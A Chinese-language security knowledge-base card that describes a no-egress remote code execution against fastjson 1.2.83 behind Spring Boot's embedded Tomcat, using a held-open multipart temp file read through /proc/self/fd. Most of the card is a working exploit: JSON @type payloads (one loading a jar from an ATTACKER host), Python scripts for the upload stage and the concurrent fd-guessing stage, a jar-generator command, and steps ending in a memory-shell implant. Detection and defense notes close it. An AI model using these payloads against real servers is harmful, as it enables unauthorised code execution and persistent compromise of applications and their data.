---
id: web-java-deser-fastjson-fd-jar-no-egress-rce
title: fastjson 1.2.83 不出网 RCE：Tomcat 临时文件 fd + jar:file
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-jar-fd-no-egress
affected_versions: fastjson 1.2.83；Spring Boot 内嵌 Tomcat（multipart 临时文件落盘）
tags:
- java
- fastjson
- autotype
- jar
- tomcat
- multipart
- proc-fd
- no-egress
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V2
  verified_at: '2026-11-04T21:38:34+08:00'
  notes: '已对照原文与 7 张截图核对：fastjson 1.2.83 @type jar: 路径、Tomcat multipart 临时文件+未结束 boundary 保持 fd、jar:file:/proc/self/fd/N 读自身上传 jar、fd 枚举与 1MB max-file-size 限制、内存马静态块落地，均与原文一致；affected_versions 已正确设置。PoC 未独立执行。'
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson-fd-jar-no-egress-rce/
draft: false
kb_aliases:
- fastjson 不出网 RCE
- fastjson /proc/self/fd
- Tomcat 临时文件 fastjson
- jar:file fd 加载
---

## 一句话结论

目标不出网时，先用一个“故意不结束”的 multipart 请求把恶意 jar 写进 Tomcat 的临时文件并让该文件描述符保持打开，再让 fastjson 用 `{"@type":"jar:file:.proc.self.fd.N!.fdN.Exception"}` 从 `/proc/self/fd/N` 读取这个 jar 并加载类，从而把“远程加载恶意 jar”变成“目标读取自身 fd”，实现不出网 RCE。

## 原理

- fastjson 1.2.83 的 `@type` 支持 `jar:` URL，常见形式为 `{"@type":"jar:http://host:port/name!/pkg.Class"}` 或 `{"@type":"jar:file:...!/pkg.Class"}`：fastjson 打开 jar，加载其中指定类，并触发其静态初始化。
- 常规远程 jar 方式要求目标能出网访问攻击者的 HTTP 服务，否则失败。`/proc/self/fd` 提供了一条本地替代路径：Linux 下 `/proc/self/fd/N` 是指向当前进程第 N 号文件描述符的符号链接。
- Spring Boot 默认内嵌 Tomcat，`spring.servlet.multipart.file-size-threshold` 默认为 0，即所有 multipart 部分都会落盘到 `javax.servlet.context.tempdir`（形如 `work/Tomcat/xxx/ROOT/`）下的临时文件；Tomcat 在写入期间持有该文件的 fd。
- 阶段 A：发送包含完整 jar + 约 60000 字节 padding 的 multipart 请求，但故意不发结尾的 `--boundary--`，并用 `keep-alive` 保持连接。请求处于“未完成”状态，Tomcat 已把 jar 内容写入临时文件，且 fd 不关闭、临时文件不清理。
- 阶段 B：并发发送大量 `{"@type":"jar:file:.proc.self.fd.N!.fdN.Exception"}`。fastjson 打开 `/proc/self/fd/N`（即阶段 A 的临时文件），按 jar 解析，加载 `fdN.Exception` 类。该类由攻击者用 ASM 重命名成路径式类名，静态块中执行 Base64 字节码（如内存马），从而完成 RCE。
- jar 内预先放入 1 个 first-stage 类和 N 个按 fd 编号命名的类；由于 fd 编号不可预测，需要枚举一段范围碰撞。Spring Boot 默认 `max-file-size=1MB`，jar + padding 必须小于该值，否则请求被拒绝/截断，fd 中的内容不是有效 jar。

## 触发条件

- 目标使用 fastjson 1.2.83，且 JSON 解析入口受攻击者控制（`@type` 生效）。
- 目标为 Linux，存在 `/proc/self/fd`。
- 目标为 Spring Boot 内嵌 Tomcat（或同等行为的外部 Tomcat），存在可接收 multipart 的上传接口，且与 fastjson 解析在同一进程。
- multipart 临时文件落在可读的 `javax.servlet.context.tempdir`，`file-size-threshold` 为 0 或上传大小超过阈值。
- 攻击者能在同一进程内维持一个未完成的 multipart 请求（HTTP/1.1 keep-alive、不发送结束 boundary）。
- 恶意 jar + padding 不超过 `max-file-size`（默认 1MB）。
- 目标不出网也可利用；出网过滤不能阻断该路径。

## 利用步骤

1. 确认 fastjson 版本与解析入口，验证 `@type` 可触发（可用 DNSLOG/本地 jar 做无害验证）。
2. 用 MemShellParty 等工具生成内存马字节码，放入 `rce.txt` 的静态块模板；模板用 `ClassLoader.defineClass` 加载 Base64 字节码并 `newInstance()`。
3. 用 jar 生成器把 first-stage 类放入 `foo/Exception`，并为 fd 范围（如 1–100）生成 `fdN/Exception.class`，类名用 ASM 改为 `jar:file:/proc/self/fd/N!/fdN/Exception`；打包成小于 1MB 的 jar。
4. 阶段 A：向目标上传接口发送 multipart，body 为 jar + 60000 字节 padding，不发送结束 boundary，保持连接。
5. 阶段 B：并发向 fastjson 入口发送 `jar:file:.proc.self.fd.N!.fdN.Exception`，N 覆盖 1–100（或更大范围），每个请求短超时。
6. 若未命中，换 fd 范围重新生成 jar 并重复；命中后访问内存马路由验证命令执行。

## PoC

```json
// 基础形式（需要目标出网）
{"@type":"jar:http://ATTACKER:18080/POC!/POC"}

// 不出网：从目标自身 fd 读取
{"@type":"jar:file:.proc.self.fd.1!.fd1.Exception"}
```

```python
# 阶段 A：上传 jar+padding，故意不发结束 boundary，保持 fd 打开
import socket
jar = open("xuan.jar", "rb").read()
bnd = "----XuanBoundary"
head = (f"--{bnd}\r\n"
        'Content-Disposition: form-data; name="file"; filename="x.jar"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n").encode()
tail = f"\r\n--{bnd}--\r\n".encode()
pad = b"\x00" * 60000
clen = len(head) + len(jar) + len(pad) + len(tail)
s = socket.create_connection(("TARGET", 8081), timeout=30)
req = (f"POST /upload HTTP/1.1\r\nHost: TARGET:8081\r\n"
       f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
       f"Content-Length: {clen}\r\nConnection: keep-alive\r\n\r\n").encode()
s.sendall(req + head + jar + pad + tail[:-4])   # 扣留结尾 "--"
# 保持 s 不关闭；随后并发打 fd
```

```python
# 阶段 B：并发碰撞 fd
import json, socket, threading
def fire(n):
    body = json.dumps({"@type": f"jar:file:.proc.self.fd.{n}!.fd{n}.Exception"}).encode()
    req = (f"POST /parse HTTP/1.1\r\nHost: TARGET:8081\r\n"
           f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
           f"Connection: close\r\n\r\n").encode() + body
    try:
        c = socket.create_connection(("TARGET", 8081), timeout=8)
        c.sendall(req); c.recv(8192); c.close()
    except Exception:
        pass
for n in range(1, 101):
    threading.Thread(target=fire, args=(n,), daemon=True).start()
```

```text
# jar 生成（示例）
java -jar fastjsonfdExploit.jar 'jar:http://127.0.0.1:18080/xuan!/foo/Exception' rce.txt 1 100
# 输出：xuan.jar (1 first-stage + 100 fd classes, total: 870376 bytes)
```

说明：PoC 为结构复现，需替换目标地址、上传路径、fastjson 解析路径与内存马字节码；未在目标环境执行。

## 变体与关联

- 变体：`jar:file:.tmp.POC!.POC` 直接指向已知本地临时文件路径，适合能预测/控制临时文件名的场景。
- 变体：其他会创建临时文件并保持 fd 的 multipart/上传实现，也可作为 fd 来源；不限于 Tomcat。
- 变体：fd 命中后可注入 Listener/Filter 型内存马，或执行任意静态块代码。
- 关联：[[web-java-component-tomcat-multipart-tempfile-fd]]（阶段 A 的 fd 保持原语）；[[web-java-deser-fastjson-resource-probing-rce]]（fastjson 远程类加载的另一种触发面）；[[web-java-classloader-jsp-memory-servlet-webshell]]（内存马落地后的持久化形态）。
- 关联：[[web-java-deser-fastjson-jdbc-rowset]]（JNDI 路线，需要出网/可达 JNDI 服务，与本卡的不出网路线互补）。

## 检测与防御

- 检测：JSON 请求中出现 `@type` 且值为 `jar:`/`file:`/`proc/self/fd`，尤其是 `jar:file:.proc.self.fd.` 组合。
- 检测：大量短时间、不同 fd 编号的 JSON 请求；同一来源同时存在未完成的 multipart 请求与高频 JSON 解析请求。
- 检测：Tomcat 工作目录 `work/Tomcat/*/ROOT/upload_*.tmp` 异常增多/长期不清理；应用进程访问 `/proc/self/fd/*`。
- 防御：升级 fastjson 或开启 safeMode / 关闭 autoType；反序列化入口加类型白名单（`ParserConfig.addAccept`）。
- 防御：限制 multipart 上传大小与临时文件生命周期；不需要上传的业务关闭 multipart；上传接口与 JSON 解析接口分离到不同进程。
- 防御：出网过滤不能防住本路径，必须同时修补 fastjson；对 `/proc/self/fd` 访问做运行时监控（如 RASP/EDR）。
